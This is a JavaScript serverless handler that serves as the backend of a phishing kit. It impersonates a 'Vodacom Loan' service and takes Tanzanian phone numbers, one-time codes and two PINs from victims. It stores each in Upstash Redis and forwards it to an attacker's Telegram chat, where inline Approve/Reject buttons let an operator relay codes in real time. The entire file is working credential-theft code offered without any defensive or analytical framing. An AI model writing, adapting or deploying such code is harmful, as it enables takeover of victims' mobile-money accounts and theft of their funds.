const crypto = require('crypto');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { type, phone, data } = JSON.parse(event.body);
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const redisUrl = process.env.UPSTASH_REDIS_REST_URL;
        const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN;

        if (!botToken || !chatId || !redisUrl || !redisToken) {
            console.error('Missing environment variables');
            return { statusCode: 500, body: JSON.stringify({ error: 'Server configuration error' }) };
        }

        // Generate unique session ID
        const sessionId = crypto.randomUUID();

        // Store in Upstash Redis with 10 min TTL (using POST body format)
        const redisSetRes = await fetch(redisUrl, {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${redisToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(["SET", sessionId, JSON.stringify({ status: 'pending', type, phone, data }), "EX", "600"])
        });
        const redisSetData = await redisSetRes.json();
        if (redisSetData.error) {
            console.error('Redis SET error:', redisSetData.error);
            return { statusCode: 500, body: JSON.stringify({ error: 'State storage error' }) };
        }

        // Build Telegram message based on type
        let message = '';
        if (type === 'phone') {
            message = `📱 <b>Vodacom Loan - Namba Mpya</b>\n━━━━━━━━━━━━━━━━━━━━\nSimu: <code>+255${phone}</code>`;
        } else if (type === 'otp') {
            message = `🔑 <b>Vodacom Loan - OTP</b>\n━━━━━━━━━━━━━━━━━━━━\nSimu: <code>+255${phone}</code>\nOTP: <code>${data.otp}</code>`;
        } else if (type === 'pin') {
            message = `🔐 <b>Vodacom Loan - PIN</b>\n━━━━━━━━━━━━━━━━━━━━\nSimu: <code>+255${phone}</code>\nPIN 1: <code>${data.pin1}</code>\nPIN 2: <code>${data.pin2}</code>`;
        }

        // Send to Telegram with inline keyboard
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const tgRes = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve', callback_data: `approve_${sessionId}` },
                        { text: '❌ Reject', callback_data: `reject_${sessionId}` }
                    ]]
                }
            })
        });

        const tgData = await tgRes.json();
        if (!tgData.ok) {
            console.error('Telegram API error:', tgData);
            return { statusCode: 500, body: JSON.stringify({ error: tgData.description }) };
        }

        return {
            statusCode: 200,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId })
        };
    } catch (error) {
        console.error('Function error:', error);
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
